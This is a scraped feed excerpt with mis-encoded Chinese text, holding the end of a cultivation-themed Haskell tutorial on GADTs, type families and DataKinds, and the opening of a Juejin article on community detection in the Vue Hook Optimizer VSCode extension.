<p>æ™®é€šçš„ <code>data</code> å®šä¹‰ï¼ˆADTï¼‰åƒæ˜¯ä¸€æŠŠç²—ç³™çš„é“å‰‘ï¼Œè€Œ <strong>GADTs</strong> åˆ™æ˜¯æ³¨å…¥äº†ç¥è¯†çš„çµå‰‘ã€‚å®ƒå…è®¸ä½ ç²¾å‡†åœ°å®šä¹‰æ¯ä¸€ä¸ªæ„é€ å‡½æ•°ç”Ÿæˆçš„â€œå› æœï¼ˆç±»å‹ï¼‰â€ã€‚</p>
<p>ç¤ºä¾‹ï¼šå¼ºç±»å‹è¡¨è¾¾å¼</p>
<p>åœ¨å‡¡é—´ï¼Œä½ å®šä¹‰ä¸€ä¸ªè¡¨è¾¾å¼å¯èƒ½éœ€è¦å¤„ç†â€œæŠŠæ•°å­—å’Œå¸ƒå°”å€¼ç›¸åŠ â€çš„èµ°ç«å…¥é­”ã€‚åœ¨ GADTs çš„æŠ¤æŒä¸‹ï¼Œè¿™ç§é”™è¯¯åœ¨ç‚¼åˆ¶ï¼ˆç¼–è¯‘ï¼‰æ—¶å°±ä¼šè¢«æŠ¹æ€ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql">{<span class="hljs-operator">-</span># <span class="hljs-keyword">LANGUAGE</span> GADTs #<span class="hljs-operator">-</span>}

data Expr a <span class="hljs-keyword">where</span>
    I   :: <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr <span class="hljs-type">Int</span>        <span class="hljs-comment">-- æ˜ç¡®ï¼šè¿™ä¸ªæ„é€ å™¨åªäº§ç”Ÿæ•´æ•°è¡¨è¾¾å¼</span>
    B   :: Bool <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr Bool      <span class="hljs-comment">-- æ˜ç¡®ï¼šè¿™ä¸ªæ„é€ å™¨åªäº§ç”Ÿå¸ƒå°”è¡¨è¾¾å¼</span>
    <span class="hljs-keyword">Add</span> :: Expr <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Expr <span class="hljs-type">Int</span> <span class="hljs-comment">-- åªæœ‰ä¸¤ä¸ªæ•´æ•°è¡¨è¾¾å¼èƒ½ç›¸åŠ </span>
</code></pre>
<blockquote>
<p><strong>ç¥æ•ˆï¼š</strong> ä½ çš„è§£é‡Šå™¨ä¸å†éœ€è¦ <code>Maybe</code> æˆ–é”™è¯¯å¤„ç†ï¼Œå› ä¸ºç±»å‹ç³»ç»Ÿå·²ç»ä¿è¯äº†ï¼šå‡¡æ˜¯èƒ½ä¼ è¿›æ¥çš„è¡¨è¾¾å¼ï¼Œç»å¯¹æ˜¯åˆæ³•çš„ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">9.2 ç±»å‹ç‚¼é‡‘æœ¯ï¼šType Familiesï¼ˆç±»å‹å®¶æ—ï¼‰</h3>
<p>å¦‚æœè¯´å‡½æ•°æ˜¯â€œå€¼â€çš„è®¡ç®—ï¼Œé‚£ä¹ˆ <strong>Type Families</strong> å°±æ˜¯**â€œç±»å‹â€çš„è®¡ç®—**ã€‚å®ƒå…è®¸ä½ åœ¨ç¼–è¯‘æœŸï¼Œæ ¹æ®è¾“å…¥çš„ç±»å‹ï¼Œæ¨å¯¼å‡ºå¦ä¸€ä¸ªç±»å‹ã€‚</p>
<p>ç¤ºä¾‹ï¼šç¥å…µèåˆ</p>
<p>ä½ æƒ³å®šä¹‰ä¸€ä¸ªæ³•æœ¯ï¼Œèƒ½æŠŠä¸¤ç§ä¸œè¥¿èåˆã€‚èåˆçš„ç»“æœå–å†³äºè¾“å…¥çš„å±æ€§ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-ini" lang="ini">{-<span class="hljs-comment"># LANGUAGE TypeFamilies #-}</span>

type family Combine a b where
    Combine Int <span class="hljs-attr">Int</span> = Int
    Combine String <span class="hljs-attr">String</span> = String
    Combine Int <span class="hljs-attr">String</span> = String  -- å¼‚æœ¯èåˆæ³•åˆ™
</code></pre>
<p>è¿™æ˜¯ä¸€ç§**â€œç¼–è¯‘æœŸå‡½æ•°â€**ã€‚åœ¨ä½ çš„ç¨‹åºè¿˜æ²¡è·‘èµ·æ¥ä¹‹å‰ï¼Œç¼–è¯‘å™¨å°±å·²ç»ç®—å¥½äº†æ‰€æœ‰çš„ç»“æœã€‚</p>
<hr/>
<h3 data-id="heading-2">9.3 æŒç®¡ç»´åº¦ï¼šData Kindsï¼ˆæ•°æ®ç§å±ï¼‰</h3>
<p>åœ¨å¤§ä¹˜æœŸï¼Œä½ ä¼šå‘ç°â€œç±»å‹â€æœ¬èº«ä¹Ÿæœ‰è‡ªå·±çš„â€œç±»å‹â€ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º Kindï¼ˆç§ï¼‰ã€‚</p>
<p>é€šè¿‡ DataKinds ç‰¹æ€§ï¼Œä½ å¯ä»¥å°†æ™®é€šçš„å€¼ï¼ˆå¦‚ True æˆ– Falseï¼‰æå‡åˆ°ç±»å‹å±‚é¢ã€‚</p>
<p>ç¤ºä¾‹ï¼šå¸¦æœ‰çŠ¶æ€çš„æ³•é˜µ</p>
<p>ä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªæ³•é˜µï¼Œå®ƒçš„ç±»å‹é‡Œè®°å½•äº†å®ƒæ˜¯â€œå¼€å¯â€è¿˜æ˜¯â€œå…³é—­â€çŠ¶æ€ï¼Œä»è€Œåœ¨ç¼–è¯‘æœŸé˜²æ­¢ä½ åœ¨å…³é—­çš„æ³•é˜µä¸Šæ–½æ³•ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql">data State <span class="hljs-operator">=</span> <span class="hljs-keyword">Open</span> <span class="hljs-operator">|</span> Closed

data MagicCircle (s :: State) <span class="hljs-keyword">where</span>
    <span class="hljs-comment">-- åªæœ‰ Open çŠ¶æ€çš„æ³•é˜µèƒ½æ–½å±•</span>
    castSpell :: MagicCircle <span class="hljs-keyword">Open</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> String
</code></pre>
<hr/>
<h3 data-id="heading-3">9.4 ç»ˆæç†æƒ³ï¼šæ­£ç¡®å³å­˜åœ¨</h3>
<p>åœ¨å¤§ä¹˜æœŸä¿®ä»™è€…çš„çœ¼ä¸­ï¼ŒBUG æ˜¯ä¸åˆé€»è¾‘çš„â€œé‚ªå´‡â€ã€‚å¦‚æœæˆ‘ä»¬èƒ½ç”¨ç±»å‹ç³»ç»Ÿå®Œæ•´åœ°æè¿°ä¸šåŠ¡é€»è¾‘ï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li><strong>ä»£ç ç¼–è¯‘é€šè¿‡ = é€»è¾‘è¯æ˜å®Œæˆ = æ°¸è¿œä¸ä¼šè¿è¡Œå‡ºé”™ã€‚</strong></li>
</ul>
<hr/>
<h2 data-id="heading-4">âš¡ å¤§ä¹˜å¿ƒå¾—ï¼šè«è¦å›°äºæ–‡å­—éšœ</h2>
<p>ç±»å‹é»‘é­”æ³•è™½ç„¶å¨åŠ›æ— ç©·ï¼Œä½†ææ˜“äº§ç”Ÿ**â€œç±»å‹è¿‡è½½â€**ã€‚</p>
<ul>
<li><strong>è­¦ç¤ºï¼š</strong> æœ‰äº›é“å‹ä¸ºäº†è¿½æ±‚ç»å¯¹çš„ç±»å‹å®‰å…¨ï¼Œå†™å‡ºäº†æ¯”é€»è¾‘æœ¬èº«å¤æ‚åå€çš„ç±»å‹ç­¾åï¼Œå¯¼è‡´åè¾ˆå¼Ÿå­å®Œå…¨æ— æ³•è¯»æ‡‚ï¼Œè¿™è¢«ç§°ä¸º**â€œé™·å…¥ç±»å‹åœ°ç‹±â€**ã€‚</li>
<li><strong>æ³•é—¨ï¼š</strong> çœŸæ­£çš„å¼ºè€…æ‡‚å¾—åœ¨â€œç®€æ´â€ä¸â€œå®‰å…¨â€ä¹‹é—´å¯»æ‰¾å¹³è¡¡ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-5">ğŸ“œ å¤§ä¹˜è¯•ç‚¼ï¼šç¬¬ä¹å…³</h2>
<p>è¯·å°è¯•è§¦ç¢°ç±»å‹å±‚é¢çš„çœŸç†ï¼š</p>
<ol>
<li><strong>ç¦å¿Œæ„é€ ï¼š</strong> å°è¯•å®ç°ä¸€ä¸ªç®€å•çš„ GADT <code>List a</code>ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª <code>SafeHead</code> å‡½æ•°ï¼Œåˆ©ç”¨ç±»å‹ç³»ç»Ÿç¡®ä¿å®ƒ<strong>æ°¸è¿œä¸ä¼š</strong>ä½œç”¨äºç©ºåˆ—è¡¨ï¼ˆæç¤ºï¼šå¯ä»¥ç»™åˆ—è¡¨åŠ ä¸€ä¸ªé•¿åº¦ç±»å‹æ ‡ç­¾ï¼‰ã€‚</li>
<li><strong>ç¥è¯†æ€è€ƒï¼š</strong> å¦‚æœæˆ‘ä»¬åœ¨ç¼–è¯‘æœŸè§£å†³äº†æ‰€æœ‰é€»è¾‘é—®é¢˜ï¼Œé‚£ä¹ˆâ€œè¿è¡Œæ—¶ï¼ˆRuntimeï¼‰â€å¯¹æˆ‘ä»¬æ¥è¯´æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</li>
</ol>
<p><strong>â€œçœ‹å±±æ˜¯å±±ï¼Œçœ‹å±±ä¸æ˜¯å±±ï¼Œçœ‹å±±ä»æ˜¯å±±ã€‚å½“ä½ æŠŠå¤æ‚çš„ç±»å‹é»‘é­”æ³•åŒ–ä¸ºå¹³æ·¡æ— å¥‡çš„æ¨æ¼”æ—¶ï¼Œä½ ä¾¿å·²æ‘¸åˆ°äº†å¤§ä¹˜æœŸçš„å¤©èŠ±æ¿ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç»ˆç« â€¦â€¦æˆ‘ä»¬å°†è¿æ¥<strong>æ¸¡åŠ«å‡ä»™ï¼šèŒƒç•´è®ºä¸ç¼–ç¨‹å“²å­¦ï¼ˆCategory Theoryï¼‰</strong> ã€‚æˆ‘ä»¬å°†ä¸å†è®¨è®ºä»£ç ï¼Œè€Œæ˜¯è®¨è®ºå®‡å®™çš„ç»“æ„ï¼Œè®¨è®ºé‚£äº›è¶…è¶Šäº†è¯­è¨€æœ¬èº«çš„æ°¸æ’æ•°å­¦ä¹‹ç¾ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¤¾åŒºåˆ’åˆ†ï¼šè®©AIç†è§£ä½ çš„ä»£ç é‡æ„æ„å›¾]]></title>    <link>https://juejin.cn/post/7588733783571857446</link>    <guid>https://juejin.cn/post/7588733783571857446</guid>    <pubDate>2025-12-29T05:50:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588733783571857446" data-draft-id="7588799600165945354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¤¾åŒºåˆ’åˆ†ï¼šè®©AIç†è§£ä½ çš„ä»£ç é‡æ„æ„å›¾"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-12-29T05:50:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="huali"/> <meta itemprop="url" content="https://juejin.cn/user/2066737589655079"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¤¾åŒºåˆ’åˆ†ï¼šè®©AIç†è§£ä½ çš„ä»£ç é‡æ„æ„å›¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2066737589655079/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    huali
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:50:05.000Z" title="Mon Dec 29 2025 05:50:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç”¨äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer" ref="nofollow noopener noreferrer">Vue Hook Optimizer</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer%2Ftree%2Fmaster%2Fpackages%2Fmcp" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer/tree/master/packages/mcp" ref="nofollow noopener noreferrer">MCP</a> ä¸€æ®µæ—¶é—´ä»¥åï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼š</p>
<p><strong>AI çš„å»ºè®®ç¡®å®ä¸é”™ï¼Œä½†æ€»æ„Ÿè§‰å®ƒåœ¨"çè’™"ã€‚</strong></p>
<p>æ¯”å¦‚ï¼Œå®ƒä¼šå‘Šè¯‰æˆ‘"è¿™äº›å˜é‡åº”è¯¥æå–ä¸ºä¸€ä¸ª Composable"ï¼Œä½†åˆ°åº•æ˜¯æå–å“ªå‡ ä¸ªï¼Ÿå“ªäº›åº”è¯¥åˆ†å¼€ï¼ŸAI ç»™çš„ç­”æ¡ˆçœ‹èµ·æ¥æœ‰é“ç†ï¼Œä½†æˆ‘è¿˜æ˜¯ä¼šçº ç»“â€”â€”è¿™æ ·åˆ†å¯¹ä¸å¯¹ï¼Ÿæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼ï¼Ÿ</p>
<p>åæ¥æˆ‘æ„è¯†åˆ°é—®é¢˜åœ¨å“ªäº†ï¼š<strong>AI çœ‹åˆ°äº†ä»£ç çš„ä¾èµ–å…³ç³»ï¼Œä½†å®ƒä¸çŸ¥é“æˆ‘å¿ƒé‡Œæ˜¯æ€ä¹ˆæƒ³çš„ã€‚</strong> å®ƒéœ€è¦æ›´å¤šçš„"çº¿ç´¢"æ¥ç†è§£æˆ‘çš„é‡æ„æ€è·¯ã€‚</p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦<strong>ç¤¾åŒºåˆ’åˆ†ï¼ˆCommunity Detectionï¼‰</strong> è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯"ç¤¾åŒºåˆ’åˆ†"ï¼Ÿè¯´å¾—å¾ˆç®€å•</h2>
<p>æˆ‘å¸¸å¸¸è¿™æ ·æƒ³è±¡ï¼šæŠŠä½ çš„ä»£ç çœ‹æˆä¸€ä¸ªå¤§çš„åŠå…¬å®¤ã€‚</p>
<p>åˆçœ‹èµ·æ¥ï¼Œæ¯ä¸ªäººéƒ½åœ¨å¿™è‡ªå·±çš„äº‹å„¿ã€‚ä½†ä½ ä»”ç»†è§‚å¯Ÿä»¥åï¼Œä¼šå‘ç°ï¼š</p>
<ul>
<li>æœ‰äº›äººç»å¸¸èšåœ¨ä¸€èµ·è®¨è®ºï¼Œä»–ä»¬ä¸€ç›´åœ¨åˆä½œ</li>
<li>æœ‰äº›äººè™½ç„¶ååœ¨åŒä¸€ä¸ªåŠå…¬å®¤ï¼Œä½†å…¶å®å„å¹²å„çš„äº‹å„¿</li>
<li>æœ‰äº›äººç»å¸¸åœ¨ä¸åŒçš„å°ç»„ä¹‹é—´è·‘æ¥è·‘å»</li>
</ul>
<p>å¦‚æœä½ æ˜¯å›¢é˜Ÿçš„è´Ÿè´£äººï¼Œä½ ä¼šæ€ä¹ˆåšï¼ŸæŠŠè¿™äº›"ç»å¸¸åœ¨ä¸€èµ·çš„äºº"åˆ’åˆ†æˆå‡ ä¸ªå°ç»„ä¼šæ—¶ä¸€ä¸ªå¥½ä¸»æ„ï¼š</p>
<ul>
<li>å°ç»„å†…éƒ¨æ²Ÿé€šå¿«ï¼Œå·¥ä½œæ•ˆç‡é«˜</li>
<li>æ¯ä¸ªå°ç»„çš„èŒè´£æ¸…æ™°ï¼Œä¸ä¼šä¹±å¥—</li>
<li>å‡ºé—®é¢˜äº†ï¼Œä¸€çœ¼å°±èƒ½çœ‹å‡ºæ˜¯å“ªä¸ªå°ç»„çš„äº‹å„¿</li>
</ul>
<p><strong>å†™ä»£ç ä¹Ÿæ˜¯è¿™ä¸ªé“ç†ã€‚</strong></p>
<p>ä½ ç»„ä»¶é‡Œçš„å˜é‡å’Œå‡½æ•°ï¼Œå®ƒä»¬ä¹‹é—´ä¹Ÿæœ‰ç±»ä¼¼çš„"æŠ±å›¢ç°è±¡"ã€‚<code>isOpen</code> å’Œ <code>handleOpenChange</code> é€šå¸¸ä¼šä¸€èµ·å‡ºç°ï¼ŒæŸäº›å‡½æ•°ä¾èµ–ç‰¹å®šçš„æ•°æ®ã€‚Vue Hook Optimizer çš„<strong>ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½</strong>ï¼Œå°±æ˜¯è‡ªåŠ¨æ‰¾å‡ºè¿™äº›"ç»å¸¸æ··åœ¨ä¸€èµ·çš„å˜é‡å’Œå‡½æ•°ç¾¤ä½“"ï¼Œç„¶åç»™ä½ å±•ç¤ºå‡ºæ¥ã€‚</p>
<h2 data-id="heading-1">ä»"å‘ç°é—®é¢˜"åˆ°"ç†è§£ç»“æ„"</h2>
<p>å‰ä¸¤ç¯‡æ–‡ç« å’±ä»¬è®²è¿‡ï¼š</p>
<ol>
<li><a href="https://juejin.cn/post/7345796354957737994" target="_blank" title="https://juejin.cn/post/7345796354957737994">æˆ‘æ˜¯è¿™æ ·é‡æ„å’Œä¼˜åŒ–ç»„ä»¶çš„</a>ï¼šä»‹ç»äº†å¦‚ä½•å‘ç°ä»£ç çš„é—®é¢˜ï¼ˆæ¯”å¦‚æ²¡ç”¨çš„å˜é‡ã€å¥—å¨ƒå‡½æ•°ã€ä¹±ä¸ƒå…«ç³Ÿçš„è€¦åˆï¼‰</li>
<li><a href="https://juejin.cn/post/7481463851298603059" target="_blank" title="https://juejin.cn/post/7481463851298603059">Vue Hook Optimizer + AI: æ¢ç´¢ Vue ç»„ä»¶ä»£ç ä¼˜åŒ–çš„æ–°å¢ƒç•Œ</a>ï¼šä»‹ç»æ•´ä¸ªå·¥å…·é“¾ï¼Œå°¤å…¶æ˜¯ MCP å’Œ AI æ€ä¹ˆå¸®ä½ ä¼˜åŒ–ä»£ç </li>
</ol>
<p>ä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼š<strong>å½“ AI è¯´"å»ºè®®æå–ä¸º Composable"çš„æ—¶å€™ï¼Œå®ƒå…¶å®æ˜¯åœ¨ççŒœã€‚</strong></p>
<p>AI èƒ½çœ‹åˆ°ä»£ç çš„ä¾èµ–å…³ç³»ï¼Œä½†å®ƒä¸çŸ¥é“ä½ å¿ƒé‡Œæ€ä¹ˆæƒ³çš„ã€‚ä½ è®¤ä¸ºå“ªäº›ä»£ç "å¤©ç”Ÿå°±åº”è¯¥åœ¨ä¸€èµ·"ï¼ŒAI è¦ä¸€ä¸ªä¸€ä¸ªåœ°è¯•ã€‚</p>
<p><strong>ç°åœ¨æœ‰äº†ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½ä»¥åï¼Œä¸ä¸€æ ·äº†ã€‚</strong> å®ƒç»™ä½ å±•ç¤ºäº†ä»£ç çš„"è‡ªç„¶åˆ†ç•Œçº¿"ã€‚</p>
<ol>
<li>ä¸€çœ¼çœ‹æ¸…å“ªäº›å˜é‡å’Œå‡½æ•°å…³ç³»æ¯”è¾ƒç´§å¯†</li>
<li>ç›´è§‚ç†è§£ä»£ç çš„å†…éƒ¨é€»è¾‘åˆ†ç»„</li>
<li>ç„¶åå‘Šè¯‰ AIï¼š"ä½ åº”è¯¥è¿™æ ·åˆ†"</li>
</ol>
<h2 data-id="heading-2">VSCode é‡Œçš„ç¤¾åŒºæ ‘è§†å›¾</h2>
<p>åœ¨æœ€æ–°çš„æ‰©å±•ä¸­æ–°å¢äº†<strong>ç¤¾åŒºæ ‘è§†å›¾</strong>åŠŸèƒ½ã€‚å½“ä½ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå·¦è¾¹ä¼šå‡ºç°ä¸ª**ã€ŒVariable Communitiesã€** é¢æ¿ã€‚é‡Œé¢æ˜¯ä¸ªæ ‘å½¢ç»“æ„ã€‚</p>
<h3 data-id="heading-3">é•¿ä»€ä¹ˆæ ·å­</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c859d453ecb4f2d88ed5320f0eba363~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaHVhbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767592205&amp;x-signature=vVEjtT7VaDux%2B2lxgHgwAnZdXtQ%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ¯ä¸€ä¸ª Community å°±æ˜¯ä¸€ä¸ª"ç´§å¯†ç›¸å…³"çš„å°å›¢ä½“ã€‚</strong> è¡¨ç¤ºå®ƒä»¬ä¹‹é—´è”ç³»æ¯”è¾ƒå¤šï¼š</p>
<ul>
<li>ç»å¸¸ä¸€èµ·å‡ºç°</li>
<li>ä¸€ä¸ªå˜äº†ï¼Œå…¶ä»–çš„ä¹Ÿè·Ÿç€å˜</li>
<li>é€šå¸¸éƒ½æ˜¯åœ¨å¹²åŒä¸€ä»¶äº‹å„¿</li>
</ul>
<h3 data-id="heading-4">ç‚¹ä¸€ä¸‹è¯•è¯•ï¼šäº¤äº’å¼é«˜äº®</h3>
<p>ä½ å¯ä»¥æ‰“å¼€é¢æ¿å³ä¸Šè§’çš„ community colors åŠŸèƒ½å¼€å…³ï¼Œå½“ä½ ç‚¹å‡»æŸä¸ª Community æˆå‘˜æ—¶ï¼ŒVSCode å°±ä¼šç”¨åŒä¸€ç§é¢œè‰²<strong>æŠŠè¿™ä¸ªç¤¾åŒºé‡Œçš„æ‰€æœ‰ä»£ç é«˜äº®å‡ºæ¥</strong>ã€‚</p>
<p>è¿™ä¸ªåŠŸèƒ½çœŸçš„å¾ˆçˆ½ï¼Œå› ä¸ºï¼š</p>
<ol>
<li><strong>ä¸€ç›®äº†ç„¶</strong> - é‚£äº›æ•£è½åœ¨ä»£ç å„ä¸ªè§’è½çš„ä¸œè¥¿ï¼Œçªç„¶å°±ä¸²åœ¨ä¸€èµ·äº†ï¼Œä½ èƒ½çœ‹å‡ºå®ƒä»¬ç¡®å®éƒ½æ˜¯ä¸€å›äº‹å„¿</li>
<li><strong>å‘ç°æ„å¤–çš„å…³è”</strong> - æœ‰æ—¶ä½ ä¼šå‘ç°ï¼Œåå­—çœ‹èµ·æ¥æ²¡å•¥å…³ç³»çš„å˜é‡ï¼Œå…¶å®åœ¨èƒŒåéƒ½æ˜¯ä¸€ä¸ªå®¶æ—ã€‚ï¼ˆæ¯”å¦‚ <code>isOpen</code> å’Œ <code>handleOpenChange</code>ï¼Œè™½ç„¶ä¸€ä¸ªæ˜¯çŠ¶æ€ï¼Œä¸€ä¸ªæ˜¯å¤„ç†å‡½æ•°ï¼Œä½†å®ƒä»¬å°±æ˜¯å¤©ç”Ÿä¸€å¯¹ï¼‰</li>
<li><strong>é‡æ„å˜å¾—æœ‰åº•æ°”</strong> - ä¸ç”¨å†çº ç»“"è¿™äº›åº”è¯¥æ”¾åœ¨ä¸€èµ·å—ï¼Ÿ"äº†ï¼Œé«˜äº®ç»™äº†ä½ ç­”æ¡ˆ</li>
</ol>
